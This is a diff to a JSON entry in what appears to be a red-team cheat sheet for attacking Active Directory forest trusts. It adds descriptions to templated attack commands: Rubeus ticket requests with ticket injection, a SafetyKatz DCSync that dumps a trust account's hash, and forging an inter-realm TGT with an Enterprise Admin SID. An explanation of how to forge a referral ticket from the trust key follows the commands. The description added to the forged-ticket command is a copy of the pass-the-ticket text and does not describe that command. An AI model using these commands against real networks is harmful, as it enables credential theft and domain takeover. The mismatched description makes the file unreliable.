@@ -231,15 +231,18 @@
   "variations": [
     {
       "label": "Request an inter-realm TGS",
-      "command": "Rubeus.exe asktgs /service:cifs/<target_dc>.<target_forest> /dc:<target_dc> /ptt /ticket:<inter_realm_tgt>"
+      "command": "Rubeus.exe asktgs /service:cifs/<target_dc>.<target_forest> /dc:<target_dc> /ptt /ticket:<inter_realm_tgt>",
+      "description": "Uses Rubeus to perform Pass-the-Ticket - injects a Kerberos ticket into the current session for lateral movement or privilege escalation without knowing the plaintext password."
     },
     {
       "label": "DCSync the inter-forest trust account",
-      "command": "SafetyKatz.exe \"lsadump::dcsync /user:<domain>\\<trust_account>$\" \"exit\""
+      "command": "SafetyKatz.exe \"lsadump::dcsync /user:<domain>\\<trust_account>$\" \"exit\"",
+      "description": "Performs DCSync by simulating a domain controller replication request (DRSUAPI). Extracts password hashes for any account from the DC without running code on it - requires DA or replication privileges."
     },
     {
       "label": "evasive-silver inter-realm TGT (Rubeus)",
-      "command": "Rubeus.exe silver /service:krbtgt/<target_forest> /rc4:<trust_key> /sids:<target_EA_sid> /user:Administrator /domain:<domain> /ptt"
+      "command": "Rubeus.exe silver /service:krbtgt/<target_forest> /rc4:<trust_key> /sids:<target_EA_sid> /user:Administrator /domain:<domain> /ptt",
+      "description": "Uses Rubeus to perform Pass-the-Ticket - injects a Kerberos ticket into the current session for lateral movement or privilege escalation without knowing the plaintext password."
     }
   ],
   "explain": "Forges an inter-realm referral TGT using the shared forest trust key to reach a trusted external forest:\n  golden /rc4:<nt_hash>     here <nt_hash> is the trust key from lsadump::trust /patch\n  /domain:<domain> /sid:<domain_sid>   your (source) domain and SID\n  /sids:<target_enterprise_admin_sid>  target forest privileged SID\n  /service:krbtgt /target:<target_domain>   forge a referral ticket toward the target realm\n  /ptt                      inject it\nThen Rubeus asktgs for a service (e.g. cifs/<dc>) in the target forest. Note: SID filtering across a forest trust usually blocks EA SIDs, so this typically yields only trust-permitted access."
